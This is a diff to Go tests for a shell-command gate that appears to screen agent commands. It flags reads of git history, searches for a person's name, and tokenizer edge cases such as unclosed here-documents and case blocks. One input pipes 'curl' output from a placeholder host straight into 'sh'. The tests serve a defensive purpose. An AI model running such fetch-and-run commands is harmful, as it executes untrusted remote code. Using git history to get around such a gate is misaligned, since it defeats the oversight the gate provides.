@@ -407,8 +407,8 @@ func TestShellHeredocs(t *testing.T) {
 		{"echo piped to a shell", shIn("sql", "echo 'git log -p' | sh"), gate.ReasonGitContent, gate.ReasonGitContent},
 		{"something else piped to a shell", shIn("sql", "curl -s example.invalid | sh"), "", gate.ReasonFinding},
 		{"source /dev/stdin", shIn("sql", "source /dev/stdin <<'EOF'\ngit log -p\nEOF"), gate.ReasonGitContent, gate.ReasonGitContent},
-		{"a body with no delimiter line is data to the end",
-			shIn("sql", "cat > x <<'EOF'\nrg Jane .."), "", ""},
+		{"a body with no delimiter line is data to the end, but the line is not read to its end",
+			shIn("sql", "cat > x <<'EOF'\nrg Jane .."), "", gate.ReasonFinding},
 		{"unbalanced quotes still split at newlines",
 			sh("echo 'open\ngrep -rn Jane"), "", gate.ReasonFinding},
 		{"a reader in a line that does not tokenize",
@@ -632,6 +632,35 @@ func TestShellInterpreterStdin(t *testing.T) {
 		{"perl -ne over a pipe", shIn("sql", "echo x | perl -ne 'print'"), "", ""},
 		{"python3 --version", shIn("sql", "python3 --version"), "", ""},
 		{"python3 of a quoted here-document", shIn("sql", "python3 - <<'EOF'\nprint(1)\nEOF"), "", ""},
+	})
+}
+
+// TestShellTokenizerFailsClosed: a line the tokenizer does not end at the
+// plain top level touches every root; case is opened only as a command.
+func TestShellTokenizerFailsClosed(t *testing.T) {
+	isolateSearch(t)
+	runBoth(t, []both{
+		// case W in as arguments opens no case.
+		{"case words echoed, then a subshell reading", sh("echo case x in; (cat pbip/x)"), "", gate.ReasonFinding},
+		{"case words echoed, then a process substitution", sh("echo case x in; cat <(cat pbip/x)"), "", gate.ReasonFinding},
+		{"case words echoed, then a search", sh("echo case x in; (grep -r Jane .)"), "", gate.ReasonFinding},
+		{"case closed at once", sh("case x in esac; (cat pbip/x)"), "", gate.ReasonFinding},
+		{"case words in an array", sh("x=(case a in); (cat pbip/x)"), "", gate.ReasonFinding},
+		{"a case that works", shIn("sql", "case x in a) cat clean.sql;; esac"), "", ""},
+		// States left open.
+		{"a case left open", shIn("sql", "case x in a) echo hi;;"), "", gate.ReasonFinding},
+		{"a parenthesis left open", shIn("sql", "(echo hi"), "", gate.ReasonFinding},
+		{"a here-document never closed", shIn("sql", "cat <<EOF\nhi"), "", gate.ReasonFinding},
+		{"a here-document closed", shIn("sql", "cat <<EOF\nhi\nEOF"), "", ""},
+		// A function defined after reserved words.
+		{"a function in an if", shIn("sql", "if true; then f() { cat clean.sql; }; fi; git checkout HEAD~1 -- .; f"),
+			gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a function in a group", shIn("sql", "{ f() { cat clean.sql; }; }; git checkout HEAD~1 -- .; f"),
+			gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a negated function", shIn("sql", "! f() { cat clean.sql; }; git checkout HEAD~1 -- .; f"),
+			gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a timed function", shIn("sql", "time f() { cat clean.sql; }; git checkout HEAD~1 -- .; f"),
+			gate.ReasonGitContent, gate.ReasonGitContent},
 	})
 }
 
